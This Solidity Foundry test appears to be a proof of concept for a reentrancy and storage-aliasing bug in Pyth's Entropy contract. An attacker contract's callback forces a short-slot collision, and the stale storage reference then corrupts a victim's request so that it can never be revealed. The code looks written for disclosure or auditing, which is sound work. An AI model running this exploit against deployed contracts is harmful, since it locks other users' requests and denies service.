// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@pythnetwork/entropy-sdk-solidity/IEntropy.sol";
import "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";
import "@pythnetwork/entropy-sdk-solidity/EntropyErrors.sol";
import "@pythnetwork/entropy-sdk-solidity/EntropyStatusConstants.sol";
import "@pythnetwork/entropy-sdk-solidity/EntropyStructsV2.sol";
import "../src/EntropyUpgradable.sol";

contract NonCallbackVictim {
    IEntropy public immutable entropy;
    address public immutable provider;
    uint64 public sequence;
    bytes32 public secret;

    constructor(IEntropy entropy_, address provider_) {
        entropy = entropy_;
        provider = provider_;
    }

    // Models a permissionless consumer endpoint which creates a legacy,
    // non-callback request. The external caller pays, while Entropy correctly
    // records this contract as the requester.
    function createRequest(bytes32 secret_) external payable returns (uint64) {
        secret = secret_;
        sequence = entropy.request{value: msg.value}(
            provider,
            entropy.constructUserCommitment(secret_),
            false
        );
        return sequence;
    }

    function revealNormally(bytes32 providerContribution) external returns (bytes32) {
        return entropy.reveal(provider, sequence, secret, providerContribution);
    }
}

contract ReentrantAliasRequester is IEntropyConsumer {
    IEntropy public immutable entropy;
    address public immutable provider;
    NonCallbackVictim public immutable victim;
    uint128 public immutable fee;
    bytes32 public immutable victimSecret;

    uint64 public oldSequence;
    uint64 public victimSequence;
    bool public callbackRan;

    constructor(
        IEntropy entropy_,
        address provider_,
        NonCallbackVictim victim_,
        uint128 fee_,
        bytes32 victimSecret_
    ) {
        entropy = entropy_;
        provider = provider_;
        victim = victim_;
        fee = fee_;
        victimSecret = victimSecret_;
    }

    function begin(bytes32 userContribution, uint32 gasLimit) external returns (uint64) {
        oldSequence = entropy.requestV2{value: fee}(
            provider,
            userContribution,
            gasLimit
        );
        return oldSequence;
    }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }

    function shortSlot(address provider_, uint64 sequence_) public pure returns (uint8) {
        bytes32 key = keccak256(abi.encodePacked(provider_, sequence_));
        return uint8(key[0]) & 0x1f;
    }

    function entropyCallback(
        uint64 sequence,
        address callbackProvider,
        bytes32
    ) internal override {
        require(!callbackRan, "callback replay");
        require(sequence == oldSequence, "wrong sequence");
        require(callbackProvider == provider, "wrong provider");
        callbackRan = true;

        uint8 target = shortSlot(provider, oldSequence);
        for (uint256 i = 0; i < 64; i++) {
            uint64 next = entropy.getProviderInfoV2(provider).sequenceNumber;
            if (shortSlot(provider, next) == target) {
                victimSequence = victim.createRequest{value: fee}(victimSecret);
                require(victimSequence == next, "sequence changed");
                return;
            }

            // Advance to the first sequence whose five-bit short key collides
            // with the in-progress callback request. These requests are valid
            // filler requests and are not themselves used as evidence.
            bytes32 fillerSecret = keccak256(abi.encodePacked("filler", next));
            entropy.request{value: fee}(
                provider,
                entropy.constructUserCommitment(fillerSecret),
                false
            );
        }
        revert("no collision within bound");
    }

    receive() external payable {}
}

contract EntropySlotAliasPoC is Test {
    EntropyUpgradable internal entropy;
    address internal constant PROVIDER = address(0xBEEF);
    address internal constant OWNER = address(0xA11CE);
    address internal constant ADMIN = address(0xAD01);
    bytes32[] internal proofs;

    function generateHashChain(
        address provider,
        uint64 startSequenceNumber,
        uint64 size
    ) internal pure returns (bytes32[] memory hashChain) {
        bytes32 value = keccak256(abi.encodePacked(provider, startSequenceNumber));
        hashChain = new bytes32[](size);
        for (uint64 i = 0; i < size; i++) {
            hashChain[size - (i + 1)] = value;
            value = keccak256(bytes.concat(value));
        }
    }

    function setUp() public {
        EntropyUpgradable implementation = new EntropyUpgradable();
        bytes memory init = abi.encodeCall(
            EntropyUpgradable.initialize,
            (OWNER, ADMIN, uint128(1), PROVIDER, false)
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), init);
        entropy = EntropyUpgradable(address(proxy));

        proofs = generateHashChain(PROVIDER, 0, 1000);
        vm.startPrank(PROVIDER);
        entropy.register(0, proofs[0], hex"0100", 1000, bytes("local"));
        entropy.setMaxNumHashes(500);
        // A nonzero provider default opts requests into the callback failure
        // state machine where the stale storage reference is used after CALL.
        entropy.setDefaultGasLimit(100_000);
        vm.stopPrank();
    }

    function test_storageReferenceAliasesNewVictimRequest() public {
        bytes32 oldUserContribution = keccak256("old-user-contribution");
        bytes32 victimSecret = keccak256("victim-secret");
        uint32 callbackGasLimit = 20_000_000;
        uint128 fee = entropy.getFeeV2(PROVIDER, callbackGasLimit);
        assertEq(fee, 1);

        NonCallbackVictim victim = new NonCallbackVictim(
            IEntropy(address(entropy)),
            PROVIDER
        );
        ReentrantAliasRequester attacker = new ReentrantAliasRequester(
            IEntropy(address(entropy)),
            PROVIDER,
            victim,
            fee,
            victimSecret
        );
        vm.deal(address(attacker), uint256(fee) * 100);

        uint64 oldSequence = attacker.begin(
            oldUserContribution,
            callbackGasLimit
        );
        uint8 oldSlot = attacker.shortSlot(PROVIDER, oldSequence);

        EntropyStructsV2.Request memory oldBefore = entropy.getRequestV2(
            PROVIDER,
            oldSequence
        );
        assertEq(
            oldBefore.callbackStatus,
            EntropyStatusConstants.CALLBACK_NOT_STARTED
        );
        assertGt(oldBefore.gasLimit10k, 0);

        entropy.revealWithCallback(
            PROVIDER,
            oldSequence,
            oldUserContribution,
            proofs[oldSequence]
        );

        assertTrue(attacker.callbackRan());
        uint64 victimSequence = attacker.victimSequence();
        assertGt(victimSequence, oldSequence);
        assertEq(
            attacker.shortSlot(PROVIDER, victimSequence),
            oldSlot,
            "PoC did not reach the aliased short-request slot"
        );

        // During callback, allocation moved the original request to overflow.
        // The outer reveal subsequently cleared that original overflow entry.
        assertEq(entropy.getRequestV2(PROVIDER, oldSequence).sequenceNumber, 0);

        EntropyStructsV2.Request memory corrupted = entropy.getRequestV2(
            PROVIDER,
            victimSequence
        );
        assertEq(corrupted.sequenceNumber, victimSequence);
        assertEq(corrupted.requester, address(victim));
        assertEq(corrupted.gasLimit10k, 0);

        // This request was created through request(), so its correct status was
        // CALLBACK_NOT_NECESSARY. The outer call's stale storage reference wrote
        // CALLBACK_NOT_STARTED into the newly allocated request instead.
        assertEq(
            corrupted.callbackStatus,
            EntropyStatusConstants.CALLBACK_NOT_STARTED,
            "victim request was not corrupted"
        );
        assertTrue(
            corrupted.callbackStatus !=
                EntropyStatusConstants.CALLBACK_NOT_NECESSARY
        );

        // The intended non-callback reveal path is now denied.
        vm.expectRevert(EntropyErrors.InvalidRevealCall.selector);
        victim.revealNormally(proofs[victimSequence]);

        // The callback path cannot recover a contract that never implemented
        // IEntropyConsumer. The transaction reverts and the corrupted request
        // remains active but unusable.
        vm.expectRevert();
        entropy.revealWithCallback(
            PROVIDER,
            victimSequence,
            victimSecret,
            proofs[victimSequence]
        );

        EntropyStructsV2.Request memory stillStuck = entropy.getRequestV2(
            PROVIDER,
            victimSequence
        );
        assertEq(stillStuck.sequenceNumber, victimSequence);
        assertEq(
            stillStuck.callbackStatus,
            EntropyStatusConstants.CALLBACK_NOT_STARTED
        );
    }
}
